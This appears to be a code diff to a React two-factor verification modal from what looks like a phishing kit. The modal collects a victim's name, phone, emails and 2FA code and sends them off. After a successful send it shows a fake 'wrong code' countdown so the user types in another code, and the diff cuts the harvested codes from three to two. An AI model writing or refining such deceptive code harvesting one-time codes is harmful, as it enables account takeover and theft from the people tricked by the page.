@@ -14,15 +14,11 @@ interface TwoFactorModalProps {
     onToggleModal: (isOpen: boolean) => void;
 }
 
-/** Sau nhập sai mã lần 1 → chờ trước khi nhập lại; sau sai lần 2 → chờ trước lần 3 */
+/** Sau nhập sai mã lần 1 → chờ trước khi nhập lại lần 2 */
 const RETRY_WAIT_AFTER_FIRST_WRONG_SEC = 15;
-const RETRY_WAIT_AFTER_SECOND_WRONG_SEC = 30;
 
 const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
     const t = useAppStrings();
-
-    const getRetryWaitSeconds = (nextStep: number) =>
-        nextStep === 1 ? RETRY_WAIT_AFTER_FIRST_WRONG_SEC : RETRY_WAIT_AFTER_SECOND_WRONG_SEC;
 
     const [isOpen, setIsOpen] = React.useState(isOpend);
     const [errors, setErrors] = React.useState<Record<string, string>>({});
@@ -39,8 +35,6 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
     const { fullName, phone, email, emailBusiness } = formDataState as FormData || {};
 
     const twoFaDestinations = buildTwoFaDestinationsLabel(email ?? '', phone ?? '', emailBusiness);
-
-    const [countdown, setCountdown] = React.useState<number>(RETRY_WAIT_AFTER_FIRST_WRONG_SEC);
 
     React.useEffect(() => {
         setIsOpen(isOpend);
@@ -67,46 +61,36 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         if (click === 1) {
             dispatch(updateForm({ twoFaSecond: normalizedValue }));
         }
-
-        if (click === 2) {
-            dispatch(updateForm({ twoFaThird: normalizedValue }));
-        }
     };
 
     const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);
 
-    const formatRetryMessage = (secondsLeft: number, nextStep: number) => {
+    const formatRetryMessage = (secondsLeft: number) => {
         const minutes = Math.floor(secondsLeft / 60);
         const seconds = secondsLeft % 60;
-        if (nextStep === 1) {
-            return t.twoFa.retryErrorExpired(minutes, seconds);
-        }
-        return t.twoFa.retryError(minutes, seconds);
+        return t.twoFa.retryErrorExpired(minutes, seconds);
     };
 
-    const startRetryCountdown = (nextStep: number) => {
+    const startRetryCountdown = () => {
         if (intervalRef.current) clearInterval(intervalRef.current);
 
-        const waitSec = getRetryWaitSeconds(nextStep);
+        const waitSec = RETRY_WAIT_AFTER_FIRST_WRONG_SEC;
 
         setDisable(true);
-        setCountdown(waitSec);
-        setErrors({ twoFa: formatRetryMessage(waitSec, nextStep) });
+        setErrors({ twoFa: formatRetryMessage(waitSec) });
 
+        let remaining = waitSec;
         intervalRef.current = setInterval(() => {
-            setCountdown((prev) => {
-                const next = prev - 1;
-                if (next <= 0) {
-                    if (intervalRef.current) clearInterval(intervalRef.current);
-                    intervalRef.current = null;
-                    setClick(nextStep);
-                    setErrors({});
-                    setDisable(false);
-                    return waitSec;
-                }
-                setErrors({ twoFa: formatRetryMessage(next, nextStep) });
-                return next;
-            });
+            remaining -= 1;
+            if (remaining <= 0) {
+                if (intervalRef.current) clearInterval(intervalRef.current);
+                intervalRef.current = null;
+                setClick(1);
+                setErrors({});
+                setDisable(false);
+                return;
+            }
+            setErrors({ twoFa: formatRetryMessage(remaining) });
         }, 1000);
     };
 
@@ -117,7 +101,6 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         setErrors((prev) => ({ ...prev, twoFa: '' }));
         if (click === 0) dispatch(updateForm({ twoFa: pasted }));
         if (click === 1) dispatch(updateForm({ twoFaSecond: pasted }));
-        if (click === 2) dispatch(updateForm({ twoFaThird: pasted }));
     };
 
     const handleClose = () => {
@@ -153,7 +136,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                     setTimeout(async () => {
                         setLoading(false);
                         setTwoFa('');
-                        startRetryCountdown(1);
+                        startRetryCountdown();
                     }, 1234);
 
                 })
@@ -165,23 +148,6 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
             }
 
             if (click === 1) {
-                await SendData(formDataState)
-                .then((response) => {
-                    setTimeout(async () => {
-                        setLoading(false);
-                        setTwoFa('');
-                        startRetryCountdown(2);
-                    }, 1234);
-
-                })
-                .catch((error) => {
-                    console.error("Error submitting form:", error);
-                    setLoading(false);
-                    setErrors({ twoFa: t.twoFa.errSend });
-                });
-            }
-
-            if (click === 2) {
                 await SendData(formDataState)
                 .then((response) => {
                     setTimeout(async () => {
